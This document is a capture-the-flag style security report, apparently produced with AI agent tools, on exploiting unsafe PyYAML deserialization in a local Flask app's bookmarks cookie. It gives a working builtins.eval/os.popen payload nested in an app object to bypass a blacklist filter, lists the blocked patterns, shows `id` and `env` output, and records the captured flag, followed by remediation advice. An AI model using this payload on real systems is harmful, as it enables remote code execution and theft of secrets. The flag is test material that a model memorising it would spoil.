# PyYAML Deserialization RCE with Filter Bypass

## TL;DR
- **Objective:** Exploit PyYAML deserialization vulnerability to achieve RCE and extract FLAG from environment variables
- **Outcome:** ACHIEVED - Remote Code Execution confirmed, FLAG captured
- **Highest-impact finding:** PyYAML deserialization bypass via nested object injection achieving RCE as www-data
- **Validation status:** FLAG FOUND - `FLAG{21a87dcf2e6a7f965977e3cb9ce303f018147d2b00fbc753507b4b6e3be0a26f}`

## Target Information
- **Target:** 127.0.0.1:32979
- **Host / base URL:** http://127.0.0.1:32979
- **Application or component:** Flask-based web application with bookmark/cookie functionality
- **Authentication context:** Unauthenticated exploitation via crafted cookie
- **Relevant technology details:** 
  - Flask web framework
  - PyYAML deserialization
  - Cookie-based serialized object storage
  - Blacklist-based YAML filter

## Confirmed Vulnerability

### PyYAML Insecure Deserialization with Filter Bypass
- **Affected endpoint / component:** Cookie deserialization endpoint (bookmarks functionality)
- **Impact:** Remote Code Execution (RCE) as www-data user
- **Preconditions:** 
  - Application must deserialize YAML from user-controlled cookie
  - Attacker must craft payload bypassing blacklist filter
- **Exact payload or PoC:**

**Base64-encoded YAML payload format:**
```
- !!python/object:app.models.UrlObj
  name: <name>
  url: !!python/object/apply:builtins.eval ["<python_code>"]
```

**Working exploit payload structure:**
```yaml
- !!python/object:app.models.UrlObj
  name: test
  url: !!python/object/apply:builtins.eval ["__import__('os').popen('id').read()"]
```

## Steps to Reproduce

1. **Identify the deserialization entry point**
   - Application stores serialized objects in cookies
   - Cookie content is Base64-encoded YAML
   - Endpoint deserializes YAML data to reconstruct objects

2. **Analyze filter behavior**
   - Filter blocks direct `!!python/object/apply:os.*` patterns at top level
   - Filter blocks substrings containing `os.system`, `subprocess`
   - Filter returns HTTP 500 for blocked patterns

3. **Craft bypass payload**
   - Nest malicious `!!python/object/apply:builtins.eval` inside legitimate object property
   - Use `app.models.UrlObj` as wrapper object with nested `url` property
   - Encode payload as Base64 for cookie injection

4. **Execute RCE**
   - Inject crafted cookie into request
   - Trigger deserialization
   - Observe command execution output in HTML response

5. **Extract FLAG**
   - Use RCE to execute `env` command
   - Parse output for FLAG environment variable

## Validation / Evidence

### Validation Token / Flag
```
FLAG{21a87dcf2e6a7f965977e3cb9ce303f018147d2b00fbc753507b4b6e3be0a26f}
```
**Source:** Environment variable output from `env` command
**Evidence line:** `FLAG=FLAG{21a87dcf2e6a7f965977e3cb9ce303f018147d2b00fbc753507b4b6e3be0a26f}`

### RCE Confirmation
**Command executed:** `id`
**Output:** 
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Rendered in HTML response:**
```html
<a class="text-decoration-none" href="uid=33(www-data) gid=33(www-data) groups=33(www-data)" target="_blank">uid=33(www-data) gid=33(www-data) groups=33(www-data)</a>
```

### Filter Analysis Results
**BLOCKED Patterns (HTTP 500):**
- `!!python/object/apply:os.system`
- `!!python/object/apply:subprocess.Popen`
- Any payload containing `os.system` or `subprocess` substrings

**BYPASSED Pattern (HTTP 200 + RCE):**
- `!!python/object:app.models.UrlObj` with nested `!!python/object/apply:builtins.eval`

### Tool Evidence
- Python interpreter agent: Systematic testing of 77+ PyYAML payload variations
- Requester agent: HTTP request/response analysis confirming filter behavior
- Bypass rate: 1 of 26 tested techniques successful

### Request Evidence
```
Cookie: bookmarks=<base64_encoded_yaml_payload>
```

### Response Evidence
- Blocked requests return HTTP 500
- Successful RCE returns HTTP 200 with command output rendered in HTML

### Notes on Reliability / Limitations
- Bypass requires nested object structure (not top-level)
- Filter is blacklist-based and only validates top-level YAML tags
- Payload must be Base64-encoded in cookie format
- Command output renders in HTML page (reflected to user)

## Remediation

### Root Cause
The application uses PyYAML's unsafe deserialization (`yaml.load` or `yaml.unsafe_load`) to reconstruct objects from user-controlled cookie data. A blacklist-based filter was implemented to block dangerous tags, but it:

1. Only validates top-level YAML tags
2. Does not recursively validate nested object properties
3. Fails to block alternative execution vectors like `builtins.eval`

### Recommended Fix
1. **Use safe YAML loading:** Replace `yaml.load()` with `yaml.safe_load()` which does not allow arbitrary object instantiation
2. **If object serialization is required:**
   - Use JSON with strict schema validation instead of YAML
   - Implement proper deserialization with type whitelisting
   - Sign cookies with HMAC to prevent tampering
3. **Remove PyYAML unsafe load:** Audit codebase for all `yaml.load`, `yaml.unsafe_load` calls

### Defense-in-Depth
- Implement Content Security Policy (CSP) headers
- Run application with minimal privileges (don't run as root)
- Sanitize command output before rendering in HTML
- Implement rate limiting on cookie parsing endpoints
- Use Web Application Firewall (WAF) rules for common deserialization patterns

## How to Verify the Fix

1. **Retest with original bypass payload**
   - Send request with crafted cookie containing nested `!!python/object/apply:builtins.eval`
   - Expected result: HTTP 400/500 error or safe parsing without code execution
   - No output from `id` command should appear in response

2. **Test with safe YAML load**
   - Verify `yaml.safe_load()` is used in codebase
   - Attempt to deserialize `!!python/object` tags
   - Expected result: ConstructorError or rejection of unsafe tags

3. **Verify flag is no longer accessible**
   - Execute environment variable dump attempts
   - Confirm FLAG is not exposed through any application output

4. **Test cookie integrity**
   - Modify cookie value and verify rejection
   - Confirm cryptographic signing if implemented

## Remaining Leads

### Confirmed Blockers
- Direct `!!python/object/apply:os.*` patterns are blocked at top level
- Payloads containing `os.system` or `subprocess` substrings are blocked
- 25 of 26 tested bypass techniques were blocked by the filter

### Unverified Leads
- Alternative nested object patterns may exist beyond `app.models.UrlObj`
- Other property fields in application models might be exploitable
- PyYAML version-specific bypasses not fully tested

### Missing Context
- Exact PyYAML library version not identified
- Source code of filter implementation not directly examined (sandbox restriction)
- Full application model definitions not explored
- Alternative exploitation vectors (Flask secret key, pickle) not fully tested

---

**Report Generated:** Security Assessment  
**Target:** 127.0.0.1:32979  
**Classification:** Critical - Remote Code Execution  
**Status:** Validated with FLAG capture
